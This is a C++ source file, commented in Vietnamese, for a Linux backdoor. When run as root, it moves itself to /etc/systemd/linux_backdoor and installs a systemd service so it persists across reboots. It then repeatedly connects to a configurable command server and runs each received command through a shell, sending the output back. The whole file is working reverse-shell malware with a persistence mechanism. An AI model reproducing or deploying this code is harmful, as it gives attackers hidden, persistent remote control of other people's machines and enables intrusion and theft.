#include <iostream>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <chrono>
#include <string>
#include <fstream>
#include <sys/stat.h>

const char* getCurrentExecutablePath() {
    static char buf[1028];
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len != -1) {
        buf[len] = '\0';
        return buf;
    } else {
        std::cerr << "Khong the lay duong dan cua chuong trinh dang chay." << std::endl;
        return "";
    }
}

void moveExecutableToNewPath(const char* newPath) {
    // Lay duong dan cua file dang chay
    const char* path;
    path = getCurrentExecutablePath();
    
    // Di chuyen file
    if (rename(path, newPath) != 0) {
        std::cerr << "Khong the di chuyen file den duong dan moi." << std::endl;
    } else
    	std::cout << "Da di chuyen file den duong dan moi thanh cong." << std::endl;
}

void AutoStart() {
    // Duong dan den tap tin thuc thi cua chuong trinh
    const char* buf;
    buf = getCurrentExecutablePath();
    std::string programPath = std::string(buf);

    // Tao noi dung cho tep dich vu
    std::string serviceContent = R"(
[Unit]
Description=My Program
After=network.target

[Service]
Type=simple
ExecStart=)" + programPath + R"(
Restart=always

[Install]
WantedBy=multi-user.target
)";

    // Luu noi dung vao tep dich vu
    std::ofstream serviceFile("/etc/systemd/system/myprogram.service");
    if (serviceFile.is_open()) {
        serviceFile << serviceContent;
        serviceFile.close();

        // Khoi dong lai systemd va khoi dong dich vu
        system("sudo systemctl daemon-reload");
        system("sudo systemctl start myprogram");
        system("sudo systemctl enable myprogram");

        std::cout << "Da cai dat va khoi dong dich vu thanh cong." << std::endl;
    } else {
        std::cerr << "Khong the mo tep dich vu đe ghi." << std::endl;
    }
}

int main() {
    if (geteuid() != 0) {
    	std::cerr << "Chuong trinh can chay duoi quyen root." << std::endl;
        // Thoát khỏi chương trình hoặc thông báo lỗi
        return 1;
    }
    
    // Duong dan ban muon chuong trinh di chuyen den
    const char *newPath = "/etc/systemd/linux_backdoor";
    moveExecutableToNewPath(newPath);
    
    // Tao mot service moi de khoi dong theo he dieu hanh
    AutoStart();
    
    while (true) {
        // Khoi tao socket
        int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == -1) {
            std::cerr << "Khong the tao socket" << std::endl;
            return -1;
        }

        // Thiet lap dia chi cua server
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(4000); // Thay the bang port cua server
        inet_pton(AF_INET, "127.0.0.1", &(serverAddr.sin_addr)); // Thay the bang dia chi IP cua server

        // Ket noi den server
        if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
            std::cerr << "Khong the ket noi den server" << std::endl;

            // Dong ket noi va giai phong tai nguyen
            close(clientSocket);

            // Doi 30 giay truoc khi ket noi lai
            std::this_thread::sleep_for(std::chrono::seconds(30));
            continue; // Quay lai vong lap đe thuc hien ket noi lai
        }

        std::cout << "Da ket noi den server" << std::endl;
        std::string response = "Client da ket noi. Hay nhap lenh\n";
        send(clientSocket, response.c_str(), response.length(), 0);

        // Nhan du lieu tu server
        char buffer[1024];
        int bytesRead;
        while ((bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
            // Xu ly du lieu nhan duoc o day
            std::cout << "Nhan lenh tu server: " << std::string(buffer, bytesRead) << std::endl;

            // Thuc hien xu ly lenh va gui phan hoi ve server
            std::string serverCommand(buffer, bytesRead);

            // Loai bo byte cuoi cung
            if (!serverCommand.empty()) {
                serverCommand.erase(serverCommand.size() - 1);
            }
            if (serverCommand == "exit") {
                exit(0);
                break;
            }
            else {
                // Thuc hien xu ly lenh o day, vi du: thuc thi lenh va gui ket qua ve server
                // Lenh shell ban muon thuc thi
                const char* command = serverCommand.c_str();

                // Mo mot luong doc tu qua trinh shell
                FILE* cmdStream = popen(command, "r");
                std::string result;
                if (cmdStream) {
                    // Doc ket qua tu luong
                    char buffer[128];
                    while (fgets(buffer, sizeof(buffer), cmdStream) != nullptr) {
                        result += buffer;
                    }
                    // Dong luong doc
                    pclose(cmdStream);
                }
                else {
                    std::cerr << "Khong the mo luong doc tu shell." << std::endl;
                    return 1;
                }
                std::string commandOutput = "Ket qua xu ly lenh: \n" + result; // Thuc hien xu ly lenh va lay ket qua
                send(clientSocket, commandOutput.c_str(), commandOutput.length(), 0);
            }
        }
        // Dong ket noi va giai phong tai nguyen
        close(clientSocket);
    }
    return 0;
}
